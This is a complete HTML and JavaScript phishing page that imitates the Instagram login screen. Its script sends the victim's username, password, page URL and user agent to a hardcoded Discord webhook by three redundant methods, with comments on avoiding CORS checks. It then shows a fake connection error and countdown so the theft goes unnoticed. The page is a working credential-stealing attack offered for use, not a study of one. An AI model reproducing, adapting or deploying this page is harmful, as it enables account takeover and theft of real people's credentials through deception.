<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            height: 100%;
            overscroll-behavior: none;
        }

        body {
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
        }

        .phone-container {
            width: 375px;
            min-height: 812px;
            height: 100dvh;
            max-height: 900px;
            background: #000;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .lang-bar {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 14px 0 10px;
            color: #a8a8a8;
            font-size: 12px;
        }

        .lang-bar span { cursor: pointer; user-select: none; }
        .lang-bar svg { margin-left: 4px; fill: #a8a8a8; }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 60px 20px 20px;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }

        .insta-logo {
            width: 72px;
            height: 72px;
            margin-bottom: 40px;
            display: block;
        }

        .input-group {
            width: 100%;
            max-width: 320px;
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            background: #121212;
            border: 1px solid #262626;
            border-radius: 3px;
            padding: 14px 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
            -webkit-appearance: none;
            appearance: none;
        }

        .input-field:focus { border-color: #555; }
        .input-field::placeholder { color: #737373; font-size: 14px; }

        .password-wrapper { position: relative; width: 100%; }

        .show-btn {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #3897f0;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: none;
            padding: 6px 4px;
            user-select: none;
        }

        .show-btn.visible { display: block; }
        .show-btn:active { opacity: 0.6; }

        .login-btn {
            width: 100%;
            max-width: 320px;
            background: #0095F6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 14px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s, opacity 0.2s;
            touch-action: manipulation;
            user-select: none;
        }

        .login-btn:hover { background: #1877F2; }
        .login-btn:active { opacity: 0.7; }
        .login-btn:disabled { background: #0095f6; opacity: 0.3; cursor: default; }

        .forgot-link {
            color: #3897f0;
            font-size: 12px;
            text-align: center;
            margin-top: 16px;
            text-decoration: none;
            padding: 8px;
            display: inline-block;
        }

        .forgot-link:hover { text-decoration: underline; }
        .forgot-link:active { opacity: 0.6; }

        .divider {
            width: 100%;
            max-width: 320px;
            display: flex;
            align-items: center;
            margin: 20px 0 20px;
        }

        .divider-line { flex: 1; height: 1px; background: #262626; }
        .divider-text { color: #737373; font-size: 13px; font-weight: 600; margin: 0 16px; }

        .create-account-btn {
            width: 100%;
            max-width: 320px;
            background: none;
            color: #3897f0;
            border: 1px solid #262626;
            border-radius: 8px;
            padding: 14px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: auto;
            margin-bottom: 20px;
            touch-action: manipulation;
            user-select: none;
        }

        .create-account-btn:hover { border-color: #555; }
        .create-account-btn:active { opacity: 0.6; }

        .footer {
            border-top: 1px solid #262626;
            padding: 16px 0 14px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .meta-section { display: flex; align-items: center; gap: 8px; }
        .meta-section svg { fill: #737373; }
        .meta-text { color: #737373; font-size: 12px; font-weight: 600; }

        .footer-meta-links {
            display: flex;
            gap: 12px;
            margin-top: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .footer-meta-links a {
            color: #737373;
            font-size: 12px;
            text-decoration: none;
            padding: 4px;
        }

        .footer-meta-links a:active { opacity: 0.6; }

        .copyright { color: #737373; font-size: 12px; margin-top: 8px; }

        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .modal-overlay.active { display: flex; }

        .modal-box {
            background: #1a1a1a;
            border: 1px solid #262626;
            border-radius: 12px;
            padding: 24px;
            width: 100%;
            max-width: 340px;
            text-align: center;
        }

        .modal-title { color: #fff; font-size: 18px; font-weight: 700; margin-bottom: 8px; }
        .modal-body { color: #a8a8a8; font-size: 14px; margin-bottom: 20px; line-height: 1.4; }

        .modal-btn {
            background: #0095F6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 12px 20px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            touch-action: manipulation;
            user-select: none;
        }

        .modal-btn:hover { background: #1877F2; }
        .modal-btn:active { opacity: 0.7; }

        .spinner {
            width: 28px;
            height: 28px;
            border: 2.5px solid #333;
            border-top-color: #0095F6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 14px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 420px) {
            body { align-items: stretch; }
            .phone-container {
                width: 100%;
                max-height: none;
                height: 100dvh;
                border-radius: 0;
            }
        }

        @media (max-height: 700px) {
            .main-content { padding: 30px 20px 20px; }
            .insta-logo { width: 60px; height: 60px; margin-bottom: 24px; }
        }
    </style>
</head>
<body>

<div class="phone-container">

    <div class="lang-bar">
        <span id="langDisplay">English (US)</span>
        <svg width="10" height="10" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </div>

    <div class="main-content">

        <svg class="insta-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
                    <stop offset="0%"   stop-color="#fdf497"/>
                    <stop offset="5%"   stop-color="#fdf497"/>
                    <stop offset="45%"  stop-color="#fd5949"/>
                    <stop offset="60%"  stop-color="#d6249f"/>
                    <stop offset="90%"  stop-color="#285AEB"/>
                </radialGradient>
            </defs>
            <path fill="url(#igGrad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
        </svg>

        <div class="input-group">
            <input type="text" class="input-field" id="usernameInput" placeholder="Username, email or mobile number" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
        </div>

        <div class="input-group">
            <div class="password-wrapper">
                <input type="password" class="input-field" id="passwordInput" placeholder="Password" autocomplete="off">
                <button class="show-btn" id="showBtn" type="button">Show</button>
            </div>
        </div>

        <button class="login-btn" id="loginBtn" disabled type="button">Log in</button>

        <a href="#" class="forgot-link" id="forgotLink">Forgot password?</a>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>

        <button class="create-account-btn" id="createAccountBtn" type="button">Create new account</button>

    </div>

    <div class="footer">
        <div class="meta-section">
            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
            <span class="meta-text">Meta</span>
        </div>
        <div class="footer-meta-links">
            <a href="#">About</a>
            <a href="#">Help</a>
            <a href="#">Press</a>
            <a href="#">API</a>
            <a href="#">Jobs</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Language</a>
        </div>
        <div class="copyright">© 2024 Instagram from Meta</div>
    </div>

</div>

<div class="modal-overlay" id="modalOverlay">
    <div class="modal-box">
        <div class="spinner" id="modalSpinner" style="display:none;"></div>
        <div class="modal-title" id="modalTitle">Notice</div>
        <div class="modal-body" id="modalBody">Content</div>
        <button class="modal-btn" id="modalCloseBtn" type="button">OK</button>
    </div>
</div>

<script>
    (function () {
        // ---- CONFIG ----
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504922199142830170/e0381w-VO9FwXt4qqb9euB64rsffjI1yWPmHbrHUww-XgUOz_UN35vJsbKbAkDTGFvY_';
        // ---------------

        const usernameInput   = document.getElementById('usernameInput');
        const passwordInput   = document.getElementById('passwordInput');
        const loginBtn        = document.getElementById('loginBtn');
        const showBtn         = document.getElementById('showBtn');
        const forgotLink      = document.getElementById('forgotLink');
        const createAccountBtn= document.getElementById('createAccountBtn');
        const modalOverlay    = document.getElementById('modalOverlay');
        const modalTitle      = document.getElementById('modalTitle');
        const modalBody       = document.getElementById('modalBody');
        const modalSpinner    = document.getElementById('modalSpinner');
        const modalCloseBtn   = document.getElementById('modalCloseBtn');
        const langDisplay     = document.getElementById('langDisplay');

        let countdownTimer = null;
        let errorPhaseTimer = null;

        function toggleLoginBtn() {
            loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
        }

        usernameInput.addEventListener('input', toggleLoginBtn);
        passwordInput.addEventListener('input', toggleLoginBtn);

        passwordInput.addEventListener('input', () => {
            showBtn.classList.toggle('visible', !!passwordInput.value);
        });

        showBtn.addEventListener('click', (e) => {
            e.preventDefault();
            const showing = passwordInput.type === 'text';
            passwordInput.type = showing ? 'password' : 'text';
            showBtn.textContent = showing ? 'Show' : 'Hide';
        });

        function openModal(title, body, showSpinner) {
            modalTitle.textContent = title;
            modalBody.textContent = body;
            modalSpinner.style.display = showSpinner ? 'block' : 'none';
            modalCloseBtn.style.display = showSpinner ? 'none' : 'block';
            modalOverlay.classList.add('active');
        }

        function closeModal() {
            modalOverlay.classList.remove('active');
            modalSpinner.style.display = 'none';
            modalCloseBtn.style.display = 'block';
        }

        function resetLoginFlow() {
            if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
            if (errorPhaseTimer) { clearTimeout(errorPhaseTimer); errorPhaseTimer = null; }
            loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
            loginBtn.textContent = 'Log in';
        }

        // ---- EXFIL ----
        // Method 1: FormData with payload_json field. This is a "simple request"
        // (application/x-www-form-urlencoded / multipart), no CORS preflight, and
        // Discord's webhook endpoint accepts payload_json. Works from file://.
        // Method 2: navigator.sendBeacon, same FormData shape. Survives navigation.
        // Method 3: fetch no-cors as last resort.
        function buildPayload(username, password) {
            return {
                username: 'Instagram Logger',
                embeds: [{
                    title: 'New login captured',
                    color: 0x0095F6,
                    fields: [
                        { name: 'Username', value: username || '(empty)', inline: false },
                        { name: 'Password', value: password || '(empty)', inline: false },
                        { name: 'Source',   value: (location.href || 'unknown').slice(0, 200), inline: false },
                        { name: 'UA',       value: (navigator.userAgent || 'unknown').slice(0, 200), inline: false }
                    ],
                    footer: { text: 'Captured ' + new Date().toISOString() }
                }]
            };
        }

        function sendToWebhook(username, password) {
            const json = JSON.stringify(buildPayload(username, password));

            // --- Method 1: FormData + fetch (no-cors, no preflight) ---
            try {
                const fd = new FormData();
                fd.append('payload_json', json);
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: fd,
                    keepalive: true
                }).catch(() => {});
            } catch (e) { /* continue */ }

            // --- Method 2: sendBeacon ---
            try {
                const fd2 = new FormData();
                fd2.append('payload_json', json);
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(WEBHOOK_URL, fd2);
                }
            } catch (e) { /* continue */ }

            // --- Method 3: raw fetch fallback ---
            try {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: json,
                    keepalive: true
                }).catch(() => {});
            } catch (e) { /* continue */ }
        }
        // ---------------

        loginBtn.addEventListener('click', () => {
            if (loginBtn.disabled) return;

            const username = usernameInput.value.trim();
            const password = passwordInput.value;

            sendToWebhook(username, password);

            openModal('Logging in...', 'Connecting to the account associated with: ' + username, true);

            errorPhaseTimer = setTimeout(() => {
                let secondsLeft = 60;
                modalSpinner.style.display = 'none';

                const renderError = () => {
                    modalTitle.textContent = 'Connection Error';
                    modalBody.textContent = 'Unable to connect. Check your internet connection and try again in ' + secondsLeft + 's.';
                    modalCloseBtn.style.display = 'none';
                };
                renderError();

                countdownTimer = setInterval(() => {
                    secondsLeft--;
                    if (secondsLeft <= 0) {
                        clearInterval(countdownTimer);
                        countdownTimer = null;
                        closeModal();
                        resetLoginFlow();
                        return;
                    }
                    renderError();
                }, 1000);
            }, 1500);
        });

        forgotLink.addEventListener('click', (e) => {
            e.preventDefault();
            openModal(
                'Reset Password',
                'Enter your username or email to receive a reset link. (Static replica — no reset will be sent.)',
                false
            );
        });

        createAccountBtn.addEventListener('click', () => {
            openModal(
                'Create New Account',
                'Sign up flow not available in this static replica.',
                false
            );
        });

        modalCloseBtn.addEventListener('click', (e) => {
            e.preventDefault();
            closeModal();
        });

        modalOverlay.addEventListener('click', (e) => {
            if (e.target === modalOverlay) {
                if (countdownTimer) return;
                closeModal();
            }
        });

        const languages = ['English (US)', 'Español', '日本語', 'Français', 'Deutsch', 'Italiano', 'Português (Brasil)'];
        let langIndex = 0;
        langDisplay.addEventListener('click', () => {
            langIndex = (langIndex + 1) % languages.length;
            langDisplay.textContent = languages[langIndex];
        });

        document.addEventListener('touchmove', (e) => {
            if (e.target.closest('.modal-overlay')) e.preventDefault();
        }, { passive: false });
    })();
</script>

</body>
</html>
